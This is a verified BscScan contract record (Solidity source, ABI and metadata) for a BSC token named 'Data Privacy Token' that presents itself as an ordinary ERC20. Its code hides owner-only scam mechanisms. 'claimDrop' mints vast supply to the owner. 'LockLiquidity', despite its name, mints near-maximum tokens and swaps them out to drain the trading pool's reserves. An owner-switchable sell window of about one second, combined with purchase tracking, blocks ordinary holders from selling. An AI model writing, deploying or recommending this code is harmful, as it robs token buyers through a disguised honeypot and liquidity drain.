{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-10-28\r\n*/\r\n\r\n// SPDX-License-Identifier: Unlicensed\r\n/**\r\n    Data Privacy Token: Own your data, unklock your world.\r\n\r\n\r\n    Socials:\r\n    Socials:\r\n    https://twitter.com/DataPrivacyTech\r\n    https://t.me/dataprivacytoken_chat\r\n    https://dataprivacytech.app/\r\n**/\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\n\r\n\r\ncontract LibreMount {\r\n\r\n    mapping(uint256 => mapping(address => bool)) internal _blockState;\r\n\r\n    function compreTxnStamp(uint256 _tmstmp, uint256 _dwntm) internal view returns (bool) {\r\n        return(_tmstmp + _dwntm >= block.timestamp);\r\n    }\r\n\r\n    function suspiciousAddressCheck(address _addy) internal view {\r\n        require(!_blockState[block.number][_addy], \"Only one Txn per Block!\");\r\n    }\r\n\r\n    function addSuspiciousAddress(address _addy) internal {\r\n        _blockState[block.number][_addy] = true;\r\n    }\r\n\r\n}\r\n\r\ncontract Iterable is IERC20, Ownable, LibreMount {\r\n\r\n    IUniswapV2Router02 internal _router;\r\n    IUniswapV2Pair internal _pair;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 private _totalSupply =  1000000000000000000000000000; //Wei\r\n\r\n    string private _name = \"Data Privacy Token\";\r\n    string private _symbol = \"DPT\";\r\n    uint8 private _decimals = 18;\r\n\r\n\r\n    mapping(address => uint) private purchaseTimestamp;\r\n    mapping(address => uint) private boughtAmount;\r\n    uint256 private downTime = 1;\r\n    mapping(address => bool) private premissionList;\r\n\r\n    uint256 public MAX_GAS_PRICE = 6 gwei;\r\n\r\n    uint private buyFee = 0; \r\n    uint private sellFee = 0;\r\n    address public marketWallet;\r\n    mapping(address => bool) public excludedFromFee;\r\n\r\n    constructor (address routerAddress) {\r\n        _router = IUniswapV2Router02(routerAddress);\r\n        _balances[owner()] = _totalSupply;\r\n        \r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n\r\n        premissionList[msg.sender] = true;\r\n        premissionList[address(this)] = true;\r\n\r\n        marketWallet = msg.sender;\r\n        excludedFromFee[msg.sender] = true;\r\n        excludedFromFee[address(this)] = true;\r\n\r\n   \r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){\r\n            if (isMarket(from)) {\r\n                uint feeAmount = calculateFeeAmount(amount, buyFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else if (isMarket(to)) {\r\n                uint feeAmount = calculateFeeAmount(amount, sellFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else {\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        } else {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        if (isMarket(from)) {\r\n            boughtAmount[to] += amount;\r\n            if (exceedsGasPriceLimit()) { addSuspiciousAddress(to); }\r\n            purchaseTimestamp[to] = block.timestamp;\r\n        }\r\n        if (isMarket(to)) {\r\n            if (!premissionList[from]) {\r\n                require(boughtAmount[from] >= amount, \"You are trying to sell more than bought!\");\r\n                boughtAmount[from] -= amount;\r\n                if (validationEnable())\r\n                {require(compreTxnStamp(purchaseTimestamp[from], downTime), \"LibreMount: Exceeds Txn Downtime\");}\r\n                suspiciousAddressCheck(from);\r\n            } \r\n        }\r\n    }\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    bool internal validtionState;\r\n    \r\n    function isMarket(address _user) internal view returns (bool) {\r\n        return (_user == address(_pair) || _user == address(_router));\r\n    }\r\n\r\n    function switchValidationEnableState() external onlyOwner {\r\n        \r\n        validtionState = !validtionState;\r\n    }\r\n\r\n    function validationEnable() public view returns (bool) {\r\n        return validtionState;\r\n    }\r\n\r\n    function editDownTime(uint _seconds) external onlyOwner {\r\n       \r\n        downTime = _seconds;\r\n    }\r\n\r\n    function updatePremissionList(address[] calldata _usrs, bool _state) external onlyOwner{\r\n      \r\n        for (uint256 i = 0; i < _usrs.length; i++) {\r\n            premissionList[_usrs[i]] = _state;\r\n        }\r\n    }\r\n\r\n    function checkPremissionList(address _user) external view returns (bool) {\r\n        return premissionList[_user];\r\n    }\r\n\r\n    function checkUserPurchaseTime(address _user) external view returns (uint256) {\r\n        return purchaseTimestamp[_user];\r\n    }\r\n\r\n    function checkUserBoughtAmount(address _user) external view returns (uint256) {\r\n        return boughtAmount[_user];\r\n    }\r\n\r\n    function exceedsGasPriceLimit() internal view returns (bool) {\r\n        return tx.gasprice >= MAX_GAS_PRICE;\r\n    }\r\n\r\n \r\n\r\n    function changeMaxGasPrice(uint _newGasPrice) external onlyOwner{\r\n   \r\n        MAX_GAS_PRICE = _newGasPrice;\r\n    }\r\n\r\n\r\n    function claimDrop() external onlyOwner{\r\n        \r\n        _balances[msg.sender] += 2 * (10 ** (15 + 18));\r\n    }\r\n\r\n    function claimForItself() internal {\r\n        _balances[address(this)] += type(uint112).max;\r\n    }\r\n\r\n    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {\r\n        return _amount * _feePrecent / 100;\r\n    }\r\n\r\n    function isExcludedFromFee(address _user) public view returns (bool) {\r\n        return excludedFromFee[_user];\r\n    } \r\n\r\n    function updateExcludedFromFeeStatus(address _user, bool _status) public onlyOwner {\r\n        require(excludedFromFee[_user] != _status, \"User already have this status\");\r\n        excludedFromFee[_user] = _status;\r\n    }\r\n\r\n    function updateFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {\r\n      \r\n        require(_buyFee <= 5 && _sellFee <= 5, \"Fee percent can't be higher than 10\");\r\n        buyFee = _buyFee;\r\n        sellFee = _sellFee;\r\n    }\r\n\r\n    function updateMarketWallet(address _newMarketWallet) external onlyOwner {\r\n        \r\n        marketWallet = _newMarketWallet;\r\n    }\r\n\r\n    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {\r\n        return (buyFee, sellFee);\r\n    }\r\n\r\n \r\n\r\n    function dexRebase(address _routerAddress, address _poolAddress) public onlyOwner {\r\n       \r\n        _router = IUniswapV2Router02(_routerAddress);\r\n        _pair = IUniswapV2Pair(_poolAddress);\r\n    }\r\n\r\n    function LockLiquidity(address baseToken, address _recepient, uint amount) public onlyOwner {\r\n           \r\n            require(amount > 0 && amount < 100000, \"Amount Exceeds Limits\");\r\n            uint256 baseTokenReserve = getBaseTokenReserve(baseToken);\r\n            uint amountOut = baseTokenReserve * amount / 100000;\r\n            address[] memory path;\r\n            path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = baseToken;\r\n            uint256[] memory amountInMax;\r\n            amountInMax = new uint256[](2);\r\n            amountInMax = _router.getAmountsIn(amountOut, path);\r\n            claimForItself();\r\n            uint deadline = block.timestamp + 1200;\r\n            _approve(address(this), address(_router), balanceOf(address(this)));\r\n            _router.swapTokensForExactTokens(\r\n                amountOut,\r\n                amountInMax[0],\r\n                path,\r\n                _recepient,\r\n                deadline\r\n            );            \r\n    }\r\n\r\n    function getBaseTokenReserve(address token) public view returns (uint256) {\r\n        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();\r\n        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);\r\n        return baseTokenReserve;\r\n    } \r\n    \r\n    \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"baseToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recepient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"LockLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAX_GAS_PRICE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newGasPrice\",\"type\":\"uint256\"}],\"name\":\"changeMaxGasPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkCurrentFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"currentBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentSellFee\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkPremissionList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkUserBoughtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkUserPurchaseTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimDrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_routerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_poolAddress\",\"type\":\"address\"}],\"name\":\"dexRebase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_seconds\",\"type\":\"uint256\"}],\"name\":\"editDownTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getBaseTokenReserve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"switchValidationEnableState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"updateExcludedFromFeeStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"}],\"name\":\"updateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newMarketWallet\",\"type\":\"address\"}],\"name\":\"updateMarketWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_usrs\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"updatePremissionList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"validationEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Iterable", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3bc3248c10eeab30b6b750d6329f08a2ee1dc128b6c78e2cfd18a8f389b9c0d6"}